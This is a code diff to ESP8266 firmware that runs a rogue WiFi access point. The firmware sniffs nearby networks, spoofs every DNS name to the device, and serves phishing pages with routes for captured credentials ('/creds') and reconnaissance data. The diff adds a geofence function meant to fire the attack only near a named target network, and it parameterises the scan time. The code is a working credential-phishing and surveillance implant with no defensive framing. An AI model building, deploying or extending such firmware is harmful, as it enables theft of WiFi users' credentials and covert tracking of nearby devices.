@@ -52,29 +52,36 @@ void setup() {
     esppl_init(cb);
     WiFi.mode(WIFI_OFF); wifi_promiscuous_enable(true);
 
-    // gather recon for 30 seconds and generate CSV
+    // scan for 5 seconds and determine if package made it or not
     SPIFFS.begin();
-    wifiRecon();
-    
-     
-    bootTime = lastActivity = millis();
+    // wifiRecon(5000);
 
-    Serial.println(); Serial.println("Starting Rogue WiFi AP \""+(String) SSID_NAME+"\"");
-    WiFi.mode(WIFI_AP);
-    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(SSID_NAME);
+    // GeoFence: if in range of target network
+    // if (isNearby("Big Varonis")) {
+        wifiRecon(scanDurationSec);
+        fileSetup();
+        
+        bootTime = lastActivity = millis();
 
-    Serial.print("Initiating Web Server at 172.0.0.1 ...");
-    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
-    webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); });
-    webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
-    webServer.on("/recon",[]() { webServer.send(HTTP_CODE, "text/html", recon()); });
-    webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
-    webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
-    webServer.begin();
-    Serial.println(" done!");
-    
-    fileSetup();
+        Serial.println(); Serial.println("Starting Rogue WiFi AP \""+(String) SSID_NAME+"\"");
+        WiFi.mode(WIFI_AP);
+        WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+        WiFi.softAP(SSID_NAME);
+
+        Serial.print("Initiating Web Server at 172.0.0.1 ...");
+        dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+        webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); });
+        webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
+        webServer.on("/recon",[]() { webServer.send(HTTP_CODE, "text/html", recon()); });
+        webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
+        webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
+        webServer.begin();
+        Serial.println(" done!");
+    // }
+
+    // else if (false) {
+    //     ESP.deepSleep(0); // edit this to add deep sleep mode
+    // }    
 }
 
 
@@ -188,8 +195,8 @@ void fileSetup() {
 
 /***** GATHER WIFI RECON *****/
 
-void wifiRecon() {
-    unsigned long interval = scanDurationSec*1000; // 30 seconds
+void wifiRecon(int scanDuration) {
+    unsigned long interval = scanDuration*1000; // milli to sec
     unsigned long currTime = millis();
     unsigned long prevTime = millis();
 
@@ -251,6 +258,15 @@ bool deviceKnown(String bssid) {
     // look through devices Array for known BSSID
     for (uint8_t i=0; i<devCount; i++) {
         if(devices[i][0].equals(bssid)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+bool isNearby(String essid) {
+    for (uint8_t i=0; i<devCount; i++) {
+        if(devices[i][4].equals(essid)) {
             return true;
         }
     }
